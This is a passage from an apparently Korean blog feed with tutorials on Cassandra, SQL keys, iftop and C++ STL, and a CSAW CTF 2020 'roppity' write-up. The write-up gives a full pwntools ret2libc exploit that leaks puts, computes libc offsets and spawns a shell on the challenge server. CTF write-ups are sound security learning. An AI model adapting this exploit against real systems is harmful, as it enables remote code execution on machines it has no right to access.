같습니다.</p><p>SimpleStrategy 옵션은 단일 데이터 센터일 경우 사용하는 옵션이며,</p><p>멀티 데이터 센터를 사용할 경우 NetworkTopologyStrategy 를 사용하면 됩니다.</p><p>또, replication_factor란 동일한 데이터의 사본(복사본)을 수신할 클러스터의 시스템 수를 의미합니다.</p><h3 id="새로운-Table-생성"><a href="#새로운-Table-생성" class="headerlink" title="새로운 Table 생성"></a>새로운 Table 생성</h3><pre><code class="sql">username@cqlsh&gt; use keyspace_name; /* 이전에 만든 keyspace로 접속 */username@cqlsh:keyspace_name&gt; create table test.test_table(idx int, name text, context text); /* 테이블 생성 */username@cqlsh:keyspace_name&gt; desc test.test_table;</code></pre><h3 id="생성한-Table에-데이터-삽입"><a href="#생성한-Table에-데이터-삽입" class="headerlink" title="생성한 Table에 데이터 삽입"></a>생성한 Table에 데이터 삽입</h3><pre><code class="sql">username@cqlsh:keyspace_name&gt; insert into test.test_table (idx, name, context) values (1, &#39;bob&#39;, &#39;bobgood&#39;); /* 데이터 삽입 */username@cqlsh:keyspace_name&gt; select * from test.test_table; /* 테이블의 모든 행 조회 */</code></pre><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><p><a href="https://meetup.toast.com/search?searchText=Cassandra">https://meetup.toast.com/search?searchText=Cassandra</a></p></li><li><p><a href="http://www.incodom.kr/Cassandra_%EC%A0%95%EC%9D%98">http://www.incodom.kr/Cassandra_%EC%A0%95%EC%9D%98</a></p></li><li><p><a href="https://newly0513.tistory.com/37">https://newly0513.tistory.com/37</a></p></li></ul>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Docx/">Docx</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/NoSQL/">NoSQL</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Cassandra/">Cassandra</category>
      
      
      <comments>https://blog.jhyeon.dev/2020/09/25/cassandra-200925/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>DB Primary Key, Foreign Key</title>
      <link>https://blog.jhyeon.dev/2020/09/24/db-key-200924/</link>
      <guid>https://blog.jhyeon.dev/2020/09/24/db-key-200924/</guid>
      <pubDate>Wed, 23 Sep 2020 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;SQL-제약조건&quot;&gt;&lt;a href=&quot;#SQL-제약조건&quot; class=&quot;headerlink&quot; title=&quot;SQL 제약조건&quot;&gt;&lt;/a&gt;SQL 제약조건&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;Not Null&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;데이터에 Null 값</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="SQL-제약조건"><a href="#SQL-제약조건" class="headerlink" title="SQL 제약조건"></a>SQL 제약조건</h3><ol><li>Not Null</li></ol><ul><li>데이터에 Null 값이 들어갈 수 없다.</li></ul><ol start="2"><li>Unique</li></ol><ul><li>데이터에 중복되는 값이 들어갈 수 없다.</li></ul><ol start="3"><li>Primary Key(PK)</li></ol><ul><li>각 행 또는 레코드를 고유하게 식별하는 값 (1+2 제약조건 포함)</li></ul><ol start="4"><li>Foreign Key(FK)</li></ol><ul><li>다른 테이블의 레코드를 참조하여 무결성을 검사한다.</li></ul><ol start="5"><li>Check</li></ol><ul><li>데이터의 범위 또는 사용자 조건을 지정한다.</li></ul><h3 id="PK-Primary-Key-란"><a href="#PK-Primary-Key-란" class="headerlink" title="PK(Primary Key)란?"></a>PK(Primary Key)란?</h3><p>데이터베이스 테이블에서 각 행 또는 레코드를 고유하게 식별하는 테이블의 필드를 의미합니다.</p><p>기본 키(PK)는 반드시 고유한 값을 가지며, 기본 키로 설정된 열은 NULL(빈 값)을 가질 수 없습니다.</p><p>또, 하나의 테이블에는 반드시 하나의 기본 키(PK)만을 구성할 수 있습니다.</p><p>(추가) 중복 항목이 입력되지 않기 위해서 PK를 사용하는데 제약조건으로는 여러 개를 추가할 수 없지만,</p><p>테이블을 만들 때 다중 PK를 지정하게 되면 생성이 가능하고 지정한 모든 PK 컬럼에는 중복 데이터가 들어갈 수 없습니다.</p><h3 id="PK-Primary-Key-생성-예제"><a href="#PK-Primary-Key-생성-예제" class="headerlink" title="PK(Primary Key) 생성 예제"></a>PK(Primary Key) 생성 예제</h3><pre><code class="sql">create table test(    userid varchar(25) not null,    username varchar(5) not null,    age int(3) not null,    primary key(userid));</code></pre><pre><code class="sql">create table test(    userid varchar(25) not null,    username varchar(5) not null,    age int(3) not null,    primary key(userid, username));</code></pre><p>다음과 같이 test 테이블을 생성하고 userid의 속성을 기본 키(PK)로 지정하기 위한 예제입니다.</p><p>이 때, PK로 지정하고자 하는 컬럼은 반드시 “not null”의 제약조건을 가지고 있어야합니다.</p><p>(추가) 2번째 예시는 다중 복합키로 테이블을 구성할 떄의 예시입니다.</p><h3 id="FK-Foreign-Key-란"><a href="#FK-Foreign-Key-란" class="headerlink" title="FK(Foreign Key)란?"></a>FK(Foreign Key)란?</h3><p>테이블의 특정 행 또는 레코드를 서로 연결시켜주는 것을 외래키(Foreign Key)라고 부르고,</p><p>RDBMS(Relation Database Management System)에서 명시적으로 테이블을 연결해주는 장치를 의미합니다.</p><p>예를 들어서 사용자로부터 주문을 받고 처리하기까지의 과정이 있다고 가정하면,</p><p>고객 정보를 저장하는 테이블, 주문을 처리하는 테이블 두개로 나누어서 보자.</p><p>그럼 고객이 특정 상품에 대해서 주문을 했을 때 주문을 처리하는 테이블로 고객의 정보와 함께 어떤 상품인지에 대한 정보가 기록될 것 이고,</p><p>여기서 주문을 한 사용자 정보를 고객 테이블에서 외래키로 참조하여 가져온다면 주문 테이블에 있는 고객들은,</p><p>실제 고객 정보 테이블에 존재하는 사용자라고 볼 수 있으며 무결성이 검증된다는 의미이다.</p><h3 id="FK-Foreign-Key-생성-예제"><a href="#FK-Foreign-Key-생성-예제" class="headerlink" title="FK(Foreign Key) 생성 예제"></a>FK(Foreign Key) 생성 예제</h3><pre><code class="sql">create table Customer_TB(    id varchar(25) not null,    name varchar(5) not null,    age int(3) not null,    phone varchar(15) not null,    address varchar(20) not null,    primary key(id));</code></pre><pre><code class="sql">create table Order_TB(    order_num int(11) not null auto_increment,    customer_id varchar(25) not null,    order_date datetime not null,    order_amount int(4) not null,    primary key(order_num),    foreign key(customer_id) references Customer_TB(id) ON UPDATE CASCADE ON DELETE CASCADE);</code></pre><p>두 예졔를 보면 위에서 간단한 예시로 설명을 했듯이 똑같이 SQL 구문으로 작성한 것이다.</p><p>여기서 ON UPDATE, ON DELETE 라는 옵션이 있는데 해당 옵션은 외래키(Foreign Key)의 제약조건에 의해</p><p>참조되는 테이블에서 수정, 삭제가 일어날 때 참조하고 있는 테이블도 시스템에서 자동으로 데이터에 대한 수정, 삭제를 수행함을 의미합니다.</p><ol><li><p>CASCADE : 참조되는 테이블에서 데이터를 삭제하거나 수정하면, 참조하는 테이블에서도 삭제와 수정이 같이 이루어집니다.</p></li><li><p>SET NULL : 참조되는 테이블에서 데이터를 삭제하거나 수정하면, 참조하는 테이블의 데이터는 NULL로 변경됩니다.</p></li><li><p>NO ACTION : 참조되는 테이블에서 데이터를 삭제하거나 수정해도, 참조하는 테이블의 데이터는 변경되지 않습니다.</p></li><li><p>SET DEFAULT : 참조되는 테이블에서 데이터를 삭제하거나 수정하면, 참조하는 테이블의 데이터는 필드의 기본값으로 설정됩니다.</p></li><li><p>RESTRICT : 참조하는 테이블에 데이터가 남아 있으면, 참조되는 테이블의 데이터를 삭제하거나 수정할 수 없습니다.</p></li></ol><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><a href="http://www.tcpschool.com/mysql/mysql_constraint_foreignKey">http://www.tcpschool.com/mysql/mysql_constraint_foreignKey</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Docx/">Docx</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/DB/">DB</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Primary-Key/">Primary Key</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Foreign-Key/">Foreign Key</category>
      
      
      <comments>https://blog.jhyeon.dev/2020/09/24/db-key-200924/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Linux[iftop] Example</title>
      <link>https://blog.jhyeon.dev/2020/09/17/linux-iftop-200917/</link>
      <guid>https://blog.jhyeon.dev/2020/09/17/linux-iftop-200917/</guid>
      <pubDate>Wed, 16 Sep 2020 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;Install&quot;&gt;&lt;a href=&quot;#Install&quot; class=&quot;headerlink&quot; title=&quot;Install&quot;&gt;&lt;/a&gt;Install&lt;/h3&gt;&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;$ sudo apt-get install libpca</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h3><pre><code class="bash">$ sudo apt-get install libpcap-dev$ sudo apt-get install iftop</code></pre><h3 id="Command"><a href="#Command" class="headerlink" title="Command"></a>Command</h3><pre><code class="bash">$ sudo iftop # 라이브로 모니터링 하기 때문에 root 권한이 필요하다.</code></pre><p>별도의 옵션 없이 실행했을때는 네트워크의 최상단 인터페이스를 기준으로 실시간 모니터링을 수행한다.</p><p>첫번째 라인은 서버의 호스트, 두번째 라인은 대상 호스트 네임(IP 주소), 세번째 라인은 패킷의 전송량을 표시해준다.</p><p>또한 하단의 TX, RX, TOTAL 정보들은 각각 전송량, 수신량, 총 송/수신량을 의미한다.</p><p>그리고 -f(filter) 옵션을 통해 특정 조건에 해당하는 네트워크 패킷만을 보여주는 옵션이 있다.</p><p>pcap-filter 형식의 문자열로 보면되고, 필터 옵션들은 다음과 같다.</p><pre><code class="bash">$ man pcap-filter</code></pre><pre><code class="bash">$ sudo iftop -f &quot;src host 127.0.0.1&quot;$ sudo iftop -f &quot;dst host 8.8.8.8&quot;</code></pre><p>주로 사용될만한 것들을 정리하면 다음과 같다.</p><p>자세한 것은 manpage에 보면 상세히 나와있다!</p><h3 id="pcap-filter"><a href="#pcap-filter" class="headerlink" title="pcap-filter"></a>pcap-filter</h3><p>dst host hostname    목적지 호스트네임(IP주소)<br>src host hostname    출발지 호스트네임(IP주소)<br>dst port port    목적지 포트<br>src port port    출발지 포트<br>ip proto protocol    프로토콜 유형<br>ether dst ehost    이더넷 목적지 주소가 ehost인지 체크<br>ether src ehost    이더넷 출발지 주소가 ehost인지 체크<br>ether host ehost    이더넷 출발지 또는 목적지 주소가 ehost인지 체크<br>gateway hostname    게이트웨이 호스트네임(IP주소)</p><h3 id="interactive-mode"><a href="#interactive-mode" class="headerlink" title="interactive-mode"></a>interactive-mode</h3><p>n    DNS Resolution on/off<br>s    Source Host Hide/UnHide<br>d    Destination Host Hide/UnHide<br>t    Cycle Line<br>N    Port Resolution on/off<br>S    Port Display(SRC) on/off<br>D    Port Display(DST) on/off<br>p    Port Display on/off<br>&lt;    Sort by Source<br>| Sort by Destination<br>o | Order by frozen/unfrozen<br>P | Pause Display<br>h | help<br>b | bar on/off<br>B | bar show 2/10/40(s) average<br>T | cumulative totals show/hide<br>j,k | scroll display<br>f | net-filter<br>l | screen-filter<br>L | lin/log scales<br>! | shell command(default: disabled)<br>q | quit</p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Docx/">Docx</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Linux/">Linux</category>
      
      <category domain="https://blog.jhyeon.dev/tags/iftop/">iftop</category>
      
      
      <comments>https://blog.jhyeon.dev/2020/09/17/linux-iftop-200917/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>CSAW CTF 2020 roppity Write up</title>
      <link>https://blog.jhyeon.dev/2020/09/14/csawctf-200914/</link>
      <guid>https://blog.jhyeon.dev/2020/09/14/csawctf-200914/</guid>
      <pubDate>Sun, 13 Sep 2020 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;p&gt;DEMON 소속팀에서 팀원분들과 CTF를 나가게 되었습니다~~&lt;/p&gt;
&lt;p&gt;오랜만에 CTF를 봐서 그런지 감이 안잡히는 문제들</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><p>DEMON 소속팀에서 팀원분들과 CTF를 나가게 되었습니다~~</p><p>오랜만에 CTF를 봐서 그런지 감이 안잡히는 문제들도 많아서 많이 헤멨는데 조금 더 분발해야겠네요 ㅜ_ㅜ</p><p>앞으로 시간될때마다 팀원분들과 같이 CTF 참여해서 글 자주 포스팅 할 예정입니다 :)</p><h3 id="roppity-analysis"><a href="#roppity-analysis" class="headerlink" title="roppity(analysis)"></a>roppity(analysis)</h3><p>먼저 문제에서 주어지는 파일은 바이너리와 libc 파일입니다.</p><p>64bit 환경에서 컴파일 되었고 Memory Mitigation은 별 다른거 없이 NX BIT만 활성화 되어있습니다.</p><p>IDA로 넘어가서 조금 더 딥하게 분석해봅시다.</p><p>메인 함수 안에서 작동하는 매우 간단한 원리의 바이너리 인것을 확인할 수 있습니다.</p><p>여기서 공격 벡터로 사용할 수 있는 함수는 puts 함수인데, 해당 함수의 실제 주소를 leak 해서 rop 해주면 끝납니다!</p><p>필요한 부분들을 하나씩 찾아봅시다.</p><p>일단 입력값이 저장되는 v4 버퍼의 크기는 rbp-20(32byte) 입니다.</p><p>그리고 함수 릭을 할려면 plt, got 값을 각각 구해야하는데 gdb를 통해서 볼수도 있지만 pwntools를 이용하면 시간 절약이 가능합니다.</p><pre><code class="py">#!/usr/bin/python3from pwn import *p = remote(&#39;pwn.chal.csaw.io&#39;,5016)e = ELF(&#39;./rop&#39;)puts_plt = e.plt[&#39;puts&#39;]puts_got = e.got[&#39;puts&#39;]</code></pre><p>이런식으로 하면 puts 함수의 plt, got를 각각 구할 수 있습니다.</p><p>함수 오프셋도 똑같이 libc 파일을 불러와서 symbols로 구해주면 되니깐 이하 생략하겠습니다~</p><p>그리고 rop에서 중요한 부분은 함수 릭을 할때 함수의 인자를 정리해줘야 해서 pop gadget 필요한데 이것도 ROPgadget 도구를 이용하면 쉽게 구합니다.</p><p>puts 함수의 인자를 정리해줄려면 pop ret로 해주면 되기 때문에 pop rdi ret 가젯을 사용하면 됩니다.</p><p>그럼 이제 함수 릭까지의 익스코드를 정리해보면 아래와 같습니다</p><pre><code class="py">payload = &quot;A&quot;*40 # 32byte + 8payload += p64(pr)payload += p64(puts_got)payload += p64(puts_plt)payload += p64(main)p.sendlineafter(&quot;\n&quot;, payload)puts_addr = u64(p.recv(6).ljust(8,&quot;\x00&quot;))print(hex(puts_addr))</code></pre><p>아까 구했던 값들을 그대로 이용해서 함수릭을 해주면 됩니다.</p><p>중간에 main symbols을 구해서 마지막에 리턴해주는 이유는 함수 leak을 하고 다시 main 함수로 리턴해서 초기의 상태로 만들어서 공격을 수행해야 하는 간단한 이유입니다.</p><p>이제 남은 일은 libc base, system, binsh의 주소를 구해서 sh을 실행시켜주면 끝납니다.</p><p>오프셋 계산은 매우 간단합니다.</p><p>libc base 주소를 구해서 그냥 offset를 더해주면 필요한 함수의 주소가 나옵니다.</p><pre><code class="py">libc_base = puts_addr - puts_offsetsystem_addr = libc_base + system_offsetbinsh_addr = libc_base + binsh_offset</code></pre><h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><pre><code class="py">#!/usr/bin/python3from pwn import *p = remote(&#39;pwn.chal.csaw.io&#39;,5016)e = ELF(&#39;./rop&#39;)libc = ELF(&#39;./libc-2.27.so&#39;)pr = 0x0000000000400683 # pop rdi retret = 0x000000000040048e # retputs_plt = e.plt[&#39;puts&#39;]puts_got = e.got[&#39;puts&#39;]main = e.symbols[&#39;main&#39;]puts_offset = libc.symbols[&#39;puts&#39;]system_offset = libc.symbols[&#39;system&#39;]binsh_offset = next(libc.search(&quot;/bin/sh&quot;))payload = &quot;A&quot;*40 # 32byte + 8payload += p64(pr)payload += p64(puts_got)payload += p64(puts_plt)payload += p64(main)p.sendlineafter(&quot;\n&quot;, payload)puts_addr = u64(p.recv(6).ljust(8,&quot;\x00&quot;))libc_base = puts_addr - puts_offsetsystem_addr = libc_base + system_offsetbinsh_addr = libc_base + binsh_offsetpayload = &quot;A&quot;*40payload += p64(pr)payload += p64(binsh_addr)payload += p64(ret)payload += p64(system_addr)p.sendline(payload)p.interactive()p.close()</code></pre>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/CTF/">CTF</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Pwnable/">Pwnable</category>
      
      <category domain="https://blog.jhyeon.dev/tags/ROP/">ROP</category>
      
      <category domain="https://blog.jhyeon.dev/tags/CSAWCTF-2020/">CSAWCTF 2020</category>
      
      
      <comments>https://blog.jhyeon.dev/2020/09/14/csawctf-200914/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>PicoCTF 2019 Write Up</title>
      <link>https://blog.jhyeon.dev/2020/09/11/picoctf-200911/</link>
      <guid>https://blog.jhyeon.dev/2020/09/11/picoctf-200911/</guid>
      <pubDate>Thu, 10 Sep 2020 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;해당 포스트 내용은 노션으로 이전되었습니다.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.notion.so/jhyeon/PicoCTF-2019-Write-up-358b3f86917443398fa9df9932df5320&quot;&gt;https://www</description>
        
      
      
      
      <content:encoded><![CDATA[<p>해당 포스트 내용은 노션으로 이전되었습니다.</p><p><a href="https://www.notion.so/jhyeon/PicoCTF-2019-Write-up-358b3f86917443398fa9df9932df5320">https://www.notion.so/jhyeon/PicoCTF-2019-Write-up-358b3f86917443398fa9df9932df5320</a></p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/CTF/">CTF</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Pwnable/">Pwnable</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
      
      <category domain="https://blog.jhyeon.dev/tags/PicoCTF2019/">PicoCTF2019</category>
      
      
      <comments>https://blog.jhyeon.dev/2020/09/11/picoctf-200911/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>C++ STL(Standard Template Library)</title>
      <link>https://blog.jhyeon.dev/2020/09/10/c-stl-200910/</link>
      <guid>https://blog.jhyeon.dev/2020/09/10/c-stl-200910/</guid>
      <pubDate>Wed, 09 Sep 2020 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;list-linked-list&quot;&gt;&lt;a href=&quot;#list-linked-list&quot; class=&quot;headerlink&quot; title=&quot;list(linked list)&quot;&gt;&lt;/a&gt;list(linked list)&lt;/h2&gt;&lt;p&gt;list는 순서를 유지</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="list-linked-list"><a href="#list-linked-list" class="headerlink" title="list(linked list)"></a>list(linked list)</h2><p>list는 순서를 유지하는 구조로 이루어진 노드 기반 컨테이너입니다.</p><p>원소가 노드 단위로 저장되며, list는 이중 연결 리스트(double linked list)이고</p><p>임의 접근이 불가능하고 순차적으로 접근만 허용됩니다.</p><p>허용 연산자(“==”, “!=”, “&lt;” “&gt;” “&lt;=” “&gt;=”)</p><h3 id="list-선언"><a href="#list-선언" class="headerlink" title="list 선언"></a>list 선언</h3><p>list it    - 빈 컨테이너 리스트 생성<br>list lt(n) - 기본값으로 초기화 된 n개위 원소를 가지는 리스트<br>list lt(n,m) - m으로 초기화 된 n개의 원소를 가지는 리스트<br>list lt(lt2) - lt2의 복사본인 lt 리스트</p><pre><code class="c++">#include &lt;link&gt; // libraryusing namespace std;</code></pre><h3 id="list-생성자-예제"><a href="#list-생성자-예제" class="headerlink" title="list 생성자 예제"></a>list 생성자 예제</h3><pre><code class="c++">#include &lt;cstdio&gt;#include &lt;iostream&gt;#include &lt;list&gt;using namespace std;int main(void)&#123;    list&lt;int&gt; lt1;    list&lt;int&gt; lt2(100);    list&lt;int&gt; lt3(100, 5);    list&lt;int&gt; lt4(lt1);    cout &lt;&lt; &quot;lt1 size&quot; &lt;&lt; lt1.size() &lt;&lt; &#39;\n&#39;; // 0    cout &lt;&lt; &quot;lt2 size&quot; &lt;&lt; lt2.size() &lt;&lt; &#39;\n&#39;; // 100    cout &lt;&lt; &quot;lt3 size&quot; &lt;&lt; lt3.size() &lt;&lt; &quot;\n&quot;; // 100    cout &lt;&lt; &quot;lt4 size&quot; &lt;&lt; lt4.size() &lt;&lt; &quot;\n&quot;; // lt1 == 0&#125;</code></pre><h3 id="list-멤버-함수"><a href="#list-멤버-함수" class="headerlink" title="list 멤버 함수"></a>list 멤버 함수</h3><p>|Name|Context<br>lt.front()| 맨 앞의 원소를 반환 및 참조한다.<br>lt.back() | 맨 뒤의 원소를 반환 및 참조한다.<br>lt.begin() | 맨 앞의 원소를 가리키는 iterator를 반환한다.<br>lt.end() | 맨 마지막의 다음 원소를 가리키는 iterator를 반환한다.<br>lt.rbegin()| 뒤에서부터 원소를 순차적으로 접근할 때 사용한다. (뒤집었을 때 첫번째)<br>lt.rend() | 뒤에서부터 원소를 순차적으로 접근할 떄 사용한다. (뒤집었을 떄 마지막)<br>lt.push_front(k) | 앞쪽으로 원소 k를 삽입한다.<br>lt.push_back(k) | 뒤쪽으로 원소 k를 삽입한다.<br>lt.pop_front() | 맨 첫번째 원소를 제거한다.<br>lt_pop_back() | 맨 마지막 원소를 제거한다.<br>lt.insert(iter, k) | iter가 가리키는 위치에 원소 k를 삽입하고 iterator를 반환한다.<br>lt.erase() | iterator가 가리키는 원소를 삭제하고, 반환값은 삭제한 원소의 다음 원소를 가리키는 iterator를 반환한다.<br>lt.size() | 원소의 개수를 반환한다.<br>lt.remove(k) | k와 같은 원소를 모두 삭제한다.<br>lt.remove_if(Predicate) | 단항 조건자 Predicate에 해당하는 원소를 모두 삭제한다.<br>lt.reverse() | 원소들의 순차열을 뒤집는다.<br>lt.sort() | 모든 원소를 오름차순으로 정렬하고, 파라미터가 오는 경우에는 파라미터를 기준으로 정렬한다.<br>lt.empty() | 리스트가 비어있으면 true를 반환하고 아닌 경우 false를 반환한다.<br>lt2.swap(lt) | lt와 lt2를 바꾼다.<br>lt2.splice(iter2, lt) | li2에서 iter2가 가리키는 lt의 모든 원소를 잘라서 붙인다.<br>lt2.unique() | 인접한 원소가 같으면 유일하게 만든다.<br>lt2.merge(lt) | lt를 lt2의 내부로 합병 정렬을 한다(기본 : 오름차순 정렬), 두번쨰 파라미터로 정렬 기준을 받을 수도 있다.</p><h3 id="list-사용-예제"><a href="#list-사용-예제" class="headerlink" title="list 사용 예제"></a>list 사용 예제</h3><pre><code class="c++">#include &lt;cstdio&gt;#include &lt;iostream&gt;#include &lt;list&gt;using namespace std;int main(void)&#123;    list&lt;int&gt; ltlist;    list&lt;int&gt;::iterator lt;    list&lt;int&gt;::iterator lter = ltlist.begin(); // auto begin    list&lt;int&gt;::iterator lter2 = ltlist.end(); // auto end    ltlist.push_back(10); // 뒤쪽으로 10(원소 k) 삽입    ltlist.push_back(11); // 뒤쪽으로 11(원소 k) 삽입    cout &lt;&lt; ltlist.front() &lt;&lt; &quot;\n&quot;; // 맨 앞 원소를 반환 및 참조    cout &lt;&lt; ltlist.back() &lt;&lt; &quot;\n&quot;; // 맨 뒤 원소를 반환 및 참조    ltlist.push_front(1); // 앞쪽으로 1(원소 k) 삽입    ltlist.push_back(12); // 뒤쪽으로 12(원소 k) 삽입    ltlist.pop_front(); // 맨 앞쪽의 원소를 제거 == 1이 삭제되겠지?    ltlist.pop_back(); // 맨 뒤쪽의 원소를 제거 == 12가 삭제되겠지?    cout &lt;&lt; ltlist.size() &lt;&lt; &quot;\n&quot;; // 리스트의 크기를 반환    lter++; // 리스트 위치 +1    ltlist.insert(lter, 3); // 리스트의 두번째 위치에 3을 삽입    lter2--;    ltlist.erase(lter2); // 마지막 원소를 가리키는 iterator의 원소를 삭제    ltlist.remove(10); // 10과 같은 원소 모두 삭제    ltlist.reverse(); // 순차열 뒤집기    ltlist.sort(); // 오름차순 정렬    cout &lt;&lt; (ltlist.empty() ? &quot;true&quot;: &quot;false&quot;) &lt;&lt; &quot;\n&quot;; // 리스트가 비어있는지 체크(삼항 연산자 사용)    for(lt = ltlist.begin(); lt != ltlist.end(); lt++)&#123; //iterator 반복문 출력 시작        cout &lt;&lt; *lt &lt;&lt; endl;    &#125;&#125;</code></pre><h2 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h2><p>STL의 sequence container의 하나인 vector는 자동으로 메모리가 할당되는 배열이다.</p><p>스택과 비슷한 개념이라고 할 수 있고, 중간에 값을 넣거나 삭제할 수 있다.</p><p>허용 연산자(“==”, “!=”, “&lt;” “&gt;” “&lt;=” “&gt;=”)</p><h3 id="vector-선언"><a href="#vector-선언" class="headerlink" title="vector 선언"></a>vector 선언</h3><pre><code class="c++">#include &lt;cstdio&gt;#include &lt;vector&gt;using namespace std;vector &lt;int&gt; v1;vector &lt;int&gt; v2;</code></pre><h3 id="vector-멤버-함수"><a href="#vector-멤버-함수" class="headerlink" title="vector 멤버 함수"></a>vector 멤버 함수</h3><p>|Name|Context<br>|v1.assign(a,b)| v1에 b의 값으로 a개의 원소를 할당한다.<br>|v1.at(idx)| idx번째 원소를 참조한다. (범위 점검)<br>|v1[idx]| idx번째 원소를 참조한다. (범위 점검 X)<br>|v1.front()| 첫번째 원소를 참조한다.<br>|v1.back()| 마지막 원소를 참조한다.<br>|v1.clear()| 모든 원소를 제거한다(size만 제거하고, 메모리(capacity)는 남아있다.)<br>|v1.push_back()| 마지막에 원소를 삽입한다.<br>|v1.pop_back()| 마지막 원소를 삭제한다.<br>|v1.begin()| 첫번째 원소를 가리킨다(iterator)<br>|v1.end()| 마지막 원소를 가리킨다(iterator)<br>|v1.rbegin()| 역순의 첫번째 원소를 가리킨다(reverse 개념)<br>|v1.rend()| 역순의 마지막 원소를 가리킨다(reverse 개념)<br>|v1.reserve(n)| n개의 원소를 저장할 위치를 예약한다. (동적할당)<br>|v1.resize(n)| 크기를 n으로 변경한다.<br>|v1.size()| 원소의 개수를 반환한다.<br>|v1.capacity()| 할당된 공간의 크기를 반환한다.<br>|v1.insert(a,b,c)| a의 위치에 b개의 c값을 삽입한다.<br>|v1.insert(a,b)| a의 위치에 b값을 삽입하고 iterator를 반환한다.<br>|v1.empty()| vector가 비어있는지 체크(true/false 반환)<br>|v2.swap(v1)| v1와 v2의 원소, capacity를 바꾼다(swap 개념)</p><p>여기서 size() 와 capacity()는 다르다.</p><p>size는 할당된 메모리안에 들어있는 요소의 개수를 반환하고, capacity는 할당된 메모리의 크기를 반환해주는 것이다.</p><h3 id="vector-사용-예제"><a href="#vector-사용-예제" class="headerlink" title="vector 사용 예제"></a>vector 사용 예제</h3><pre><code class="c++">#include &lt;cstdio&gt;#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;int main(void)&#123;    vector&lt;int&gt; v1;    vector&lt;int&gt; v2;    vector &lt;int&gt;::iterator iter;    v1.push_back(10); // 맨 뒤에 원소 삽입 아래도 동일    v1.push_back(9);    v1.push_back(8);    for(iter = v1.begin(); iter != v1.end(); iter++)&#123; // iterator 반복문 선언        cout &lt;&lt; *iter &lt;&lt; endl;    &#125;    cout &lt;&lt; v1.size() &lt;&lt; &quot;\n&quot;; // vector v1 사이즈 반환 (10,9,8 이니 총 3개 반환)    cout &lt;&lt; v1.capacity() &lt;&lt; &quot;\n&quot;; // vector v1 할당 메모리 반환    v1.pop_back(); // 맨 끝에 있는 원소를 삭제, 8이 삭제되겠지~    //v1.clear(); // 모든 원소 삭제    cout &lt;&lt; v1.size() &lt;&lt; &quot;\n&quot;; // vector v1 사이즈 반환 (clear해서 0 반환)    cout &lt;&lt; (v1.empty() ? &quot;true&quot;:&quot;false&quot;) &lt;&lt; &quot;\n&quot;; // vector가 비어있는지 체크(삼항 연산자 사용)    cout &lt;&lt; v1.front() &lt;&lt; &quot;\n&quot;; // 맨 앞의 원소 반환 및 참조    cout &lt;&lt; v1.back() &lt;&lt; &quot;\n&quot;; // 맨 뒤의 원소 반환 및 참조&#125;</code></pre><h2 id="set"><a href="#set" class="headerlink" title="set"></a>set</h2><p>set은 associative container로 노드 기반 컨테이너로 구성되어 있고 균형 이진트리이다.</p><p>key로 불리는 원소의 집합으로 이루어진 컨테이너이다. (중복 허용 X)</p><p>insert 함수에 의해서 원소가 삽입되는데 이 떄의 원소는 자동으로 정렬(오름차순)된다.</p><p>허용 연산자(“==”, “!=”, “&lt;” “&gt;” “&lt;=” “&gt;=”)</p><h3 id="set-선언"><a href="#set-선언" class="headerlink" title="set 선언"></a>set 선언</h3><pre><code class="c++">#include &lt;cstdio&gt;#include &lt;iostream&gt;#include &lt;set&gt;using namespace std;int main(void)&#123;    set&lt;int&gt; s1; // 기본 생성자 선언&#125;</code></pre><h3 id="set-초기화"><a href="#set-초기화" class="headerlink" title="set 초기화"></a>set 초기화</h3><p>|Name|Context<br>|set&lt;자료형&gt; 변수이름| 기본 생성자 선언<br>|set&lt;자료형&gt; 변수이름(복사할 변수이름)| 생성자 선언 후 복사한 값으로 초기화</p><h3 id="set-반복자-iterator"><a href="#set-반복자-iterator" class="headerlink" title="set 반복자(iterator)"></a>set 반복자(iterator)</h3><p>|Name|Context<br>|s1.begin()| 첫번째 원소를 가리킨다.<br>|s1.end()| 마지막 원소를 가리킨다.<br>|s1.rbegin()| 거꾸로해서 첫번째 원소를 가리킨다. (즉, 마지막 원소 = 